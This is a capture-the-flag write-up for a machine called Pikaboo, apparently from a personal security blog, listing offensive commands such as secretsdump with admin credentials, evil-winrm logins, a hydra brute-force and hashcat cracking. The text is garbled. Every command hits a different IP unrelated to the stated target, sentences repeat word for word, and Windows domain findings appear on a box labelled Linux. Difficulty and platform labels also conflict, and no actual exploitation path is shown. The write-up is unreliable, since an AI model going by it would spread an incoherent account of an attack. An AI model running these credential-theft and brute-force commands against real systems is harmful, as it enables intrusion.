---
TitleSEO: "PwnTillDawn — Pikaboo (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Pikaboo (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Pikaboo. Silver Ticket and NTLM Relay to achieve insane compromise on Linux."
Keywords: "linux, hackthebox, easy, hard, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-pikaboo-805.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-pikaboo-805/"
Date: "2025-09-10"
Tags: "Linux, HackTheBox, Easy, Hard, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-pikaboo-805"
Permalink: "/writeups/htb-pikaboo-805.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Pikaboo** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.66.192.191`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.27.15.133/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.57.90
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.68.198.54 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.203.171/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.99.182.175 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.74.34.108 -u administrator -p 'P@ssw0rd!'
```

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **NTLM Relay**.

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

```bash
gobuster dir -u http://10.115.68.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.22.84/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.210.117 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.81.158.66 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p27017,445,3268 10.86.230.8 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.57.155.217 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
gobuster dir -u http://10.110.177.170/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `lookupsid`
- `msfvenom`
- `feroxbuster`
- `metasploit`
- `dcomexec`
- `wpscan`
- `ldapsearch`

### Key Takeaways

- Silver Ticket
- NTLM Relay
- SSTI
- AlwaysInstallElevated
